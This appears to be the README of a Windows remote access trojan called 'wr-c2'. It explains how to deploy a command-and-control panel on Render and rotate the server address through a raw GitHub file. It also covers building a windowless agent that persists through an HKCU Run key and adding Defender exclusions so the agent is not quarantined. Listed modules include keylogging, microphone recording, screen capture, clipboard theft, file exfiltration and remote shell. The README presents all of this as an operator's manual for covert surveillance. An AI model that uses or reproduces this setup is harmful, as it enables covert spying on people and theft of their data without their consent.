# wr-c2

Windows agent + browser C2 panel. The server lives on Render, the agent is a
single self-contained `.exe`, and the C2 address is resolved at runtime from a
raw GitHub file so you never rebuild to move the server.

```
rat/
├─ agent/            C# WinForms agent (never shows a window)
│  ├─ Program.cs           entry, single-instance mutex, install
│  ├─ UI/HiddenForm.cs     invisible form that owns the message pump
│  ├─ Core/Resolver.cs     pulls the live C2 url from raw GitHub
│  ├─ Core/Transport.cs    WSS client, reconnect, binary frames, chunked blobs
│  ├─ Modules/             shell, files, screen, mic, keylog, sysinfo, persist
│  └─ Generated/           BuildInfo.g.cs — written by build.ps1
├─ server/           FastAPI panel + agent gateway
│  ├─ app.py               REST + two websockets (agent, panel)
│  └─ templates, static    card-grid panel, login page
├─ builder/          WinForms build tool (fill fields, press BUILD)
├─ render.yaml       Render blueprint (repo root, rootDir: server)
├─ resolver/c2.json  ← change this file to point agents at a new server
└─ build.ps1         builds + stamps the agent
```

## 1. deploy the server

Push this repo to GitHub, then in Render: **New → Blueprint**, pick the repo.
Render reads `render.yaml` at the repo root and asks for:

| env | what |
|---|---|
| `PANEL_PASSWORD` | your login for the web panel |
| `AGENT_TOKEN` | shared secret the agent sends on connect — same string goes into the build |
| `SECRET_KEY` | any long random string; signs the panel cookie |

Copy the agent token you typed — it must match the build exactly.
First boot takes a minute; the URL is `https://<name>.onrender.com`.

Free plan sleeps after ~15 min idle. Agents retry with backoff, and the panel
wakes the instance when you open it. Storage is ephemeral on free — files,
downloads and keylog history vanish on redeploy (agents re-register themselves).

## 2. point the resolver at the server

Edit `resolver/c2.json`:

```json
{ "c2": "wss://your-app.onrender.com/ws", "enabled": true }
```

Grab the **raw** URL:
`https://raw.githubusercontent.com/<you>/<repo>/main/resolver/c2.json`

`enabled: false` is a kill switch — every agent drops off and stops retrying
until you flip it back. Agents re-read the resolver every 5 minutes.

## 3. build the agent

```powershell
powershell -ExecutionPolicy Bypass -File .\build.ps1 `
  -Resolver "https://raw.githubusercontent.com/<you>/<repo>/main/resolver/c2.json" `
  -Token    "<AGENT_TOKEN from Render>" `
  -C2       "wss://your-app.onrender.com/ws" `
  -Version  "1.1.0"
```

Output: `dist/wrsvc.exe` (~63 MB, self-contained, runs on a clean Windows box
with no .NET installed).

Or skip the terminal entirely:

```powershell
dotnet run --project builder
```

`wr-builder` finds `build.ps1` automatically, streams the compiler output, and
has an **open dist** button. Same four fields, same flags.

Options:

| flag | effect |
|---|---|
| `-Name something` | exe + assembly name, also the autostart key |
| `-Tag something` | folder/key name under `%APPDATA%\Microsoft\` |
| `-Admin` | `requireAdministrator` manifest (UAC prompt every launch) |
| `-NoCompress` | bigger exe, faster startup |

## running it

```powershell
.\dist\wrsvc.exe              # installs to %APPDATA%\Microsoft\wrsvc + HKCU Run key
.\dist\wrsvc.exe --no-install # fire and forget, no persistence
```

Unsigned exes get quarantined by Defender on some machines. Add exclusions
before the first launch:

```powershell
Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\wrsvc"
Add-MpPreference -ExclusionPath "<folder containing wrsvc.exe>"
```

Then open `https://<name>.onrender.com`, log in, pick the target card.

## panel

The landing view is a card grid — one card per agent, each with a live screen
thumbnail, host/user, IP, short id, OS/arch/monitor count, CPU and RAM chips,
online state and round-trip ping. Search filters by host, user, id, IP or CPU;
the icons sort, filter online-only, select all, clear, and switch grid/list.

Click a card to open the console sheet (7 tabs down the left rail):

- **console** — quick-action chips, scrolling output, `cmd`/`ps` input with
  history (up/down arrows)
- **files** — real expandable tree; click a folder to lazy-load it, click a
  file to pull it back as a download
- **screen** — latest preview frame, full-quality capture, pause/resume the
  stream, preview interval
- **media** — microphone recorder (plays inline), clipboard read/write,
  text-to-speech, popup, mute
- **keylog** — start/stop/dump/clear, live streaming
- **system** — spec cards plus one-click power/volume/registry/search actions
- **transfers** — every file, screenshot and recording with size and a direct
  download link

## modules

`shell`, `exec`, `sysinfo`, `ps`, `drives`, `ls`, `cat`, `download`, `wget`,
`upload`, `rm`, `mkdir`, `mv`, `cp`, `screenshot`, `preview`, `mic`, `keylog`,
`persist`, `clipboard`, `msgbox`, `say`, `volume`, `power`, `services`,
`registry`, `wifi`, `software`, `tasks`, `startup`, `search`, `kill`, `net`,
`exit`.

`download` accepts several paths separated by newlines or `;`, plus wildcards
and folders — anything more than one hit is packed into a single zip.

## protocol

Agent → server (JSON over WS, `X-Agent-Token` header):

```json
{"type":"hello","agent_id":"…","host":"…","user":"…","os":"…","os_short":"W11",
 "arch":"amd64","cpu":"Ryzen 7 7735HS","ram":15.2,"gpu":"…","monitors":1,
 "admin":true,"ver":"1.1.0"}
{"type":"result","id":"cmd-id","body":{"ok":true,"stdout":"…","stderr":"…","meta":{}}}
{"type":"event","kind":"keylog","data":"…"}
{"type":"event","kind":"xfer:start","xfer":"…","name":"file","total":4,"size":900000,"meta":{}}
{"type":"event","kind":"xfer","xfer":"…","name":"file","seq":0,"total":4,"meta":{},"data":"<b64>"}
{"type":"pong","ts":123.456}
```

Screen previews do **not** go through that path — they are raw JPEG binary WS
frames (~14 KB at 640px, q45, every 4 s by default). No base64 tax.

Server → agent:

```json
{"type":"cmd","id":"…","module":"shell","args":{"cmd":"whoami","shell":"cmd"}}
{"type":"ping","ts":123.456}
```

## notes

- The binary carries the resolver URL, the agent token and a fallback C2
  string. The resolver URL is fetched every 5 minutes, so rotating the C2 is
  one text-file edit.
- Agent identity is `sha256(machine|user|cpu|arch)[:8]`, so a reconnect lands on
  the same card. A per-machine/user mutex prevents duplicate instances.
- Commands execute serially per agent — one queue, no interleaving — but each
  agent has its own queue, so the fleet runs in parallel. Shell calls time out
  at 60 s (`"timeout"` arg, ms).
- Ping is measured server-side with `time.perf_counter()`: the server sends
  `{"type":"ping","ts":…}`, the agent echoes the same number, the round trip is
  shown in ms (`—` until the first sample).
- The keylogger needs the WinForms message pump; that's why `HiddenForm` exists
  and is never visible.
- `%APPDATA%\Microsoft\<tag>\agent.log` is capped at 512 KB and is the first
  place to look when an agent won't stay connected.
